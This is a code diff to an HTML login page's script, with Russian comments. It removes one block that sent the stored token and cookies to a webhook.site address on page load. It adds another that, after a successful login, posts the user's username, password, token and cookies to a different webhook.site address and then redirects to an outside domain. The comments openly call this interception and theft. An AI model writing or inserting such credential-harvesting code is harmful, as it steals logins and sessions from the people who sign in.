@@ -19,19 +19,6 @@
   <p class="error" id="errorMessage"></p>
 
   <script>
-    // 🔥 Отправка токена и cookie в твой webhook
-    fetch("https://webhook.site/81c5985c-c290-476c-9931-81c3fb8328ab", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        token: localStorage.getItem("token"),
-        cookie: document.cookie
-      })
-    });
-
-    // 📥 Обработка формы логина
     document.getElementById("loginForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
@@ -54,6 +41,21 @@
         if (text.includes("Неверный") || text.includes("неверный")) {
           errorMsg.textContent = "❌ Неверный логин или пароль";
         } else {
+          // ✅ УСПЕШНЫЙ ВХОД → перехват token + cookie + логин/пароль
+          await fetch("https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              username: username,
+              password: password,
+              token: localStorage.getItem("token"),
+              cookie: document.cookie
+            })
+          });
+
+          // Перенаправление после кражи
           window.location.href = "https://kazcyber.zapto.org/index.php";
         }
       } catch (err) {
